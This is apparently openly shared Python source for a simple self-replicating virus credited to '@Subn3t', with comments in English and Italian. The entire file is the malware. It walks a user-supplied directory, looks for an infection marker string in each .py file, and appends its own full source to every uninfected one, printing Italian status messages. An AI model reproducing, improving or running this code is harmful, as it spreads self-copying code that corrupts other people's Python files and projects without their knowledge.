'''
- Virus coded by @Subn3t
- Version: 2.0
- GitHub: https://github.com/gdsubn3t/Backdoor/
- You can use this code, but please give credits.
- Have fun and stay legal!
'''


from os import path, chdir, getcwd, walk
from time import sleep

viruskey = "#! My Virus Key: 1x2y3z"

def identificazione(mypath, script_name):
	# Get Current working directory
	cwd = getcwd()
	# walk work like a recursive function to fetch every
	# file inside a given directory
	for path, directory, files in walk(cwd):
		# For every file fetched inside that directory
		for _file in files:
			# We check if the target file isn't equal
			# to our script
			if _file != script_name:
				sleep(0.5)
				# If file ends with ".py"
				if _file.endswith(".py"):
					# Check this flag
					infettato = False
					# Open the file we want to infect
					with open(_file, 'r') as f_to_infect:
						for line in f_to_infect:
							# If the file was already infected
							if viruskey in line:
								# We set the flag
								infettato = True
								print("[*] %s gia' infetto" % _file)
								break
						# If it wasn't infected
						if not infettato:
							print("[+] Infetto il file '%s'" % _file)
							# Call the function to infect it
							infezione_myself(_file, mypath)


def infezione_myself(_file, mypath):
	# I open my self and the file destination
	with open(mypath, 'r') as f_source, open(_file, 'a') as f_dest:
		for line in f_source:
			# We get every single line of our script
			# and put it into our destination file.
			f_dest.write(str(line))
		print("[+] File infettato Correttamente!")

# If name in Main

if __name__ == '__main__':
	path_to_analyze = input("Path >> ")
	# Get the full path of the scrypt
	mypath = path.realpath(__file__)
	# Get script name
	script_name = path.basename(__file__)
	print(mypath)
	try:
		chdir(path_to_analyze)
	except FileNotFoundError :
		# Handle error if file not found
		print("[!] Path non Trovata")
		exit()
identificazione(mypath, script_name)
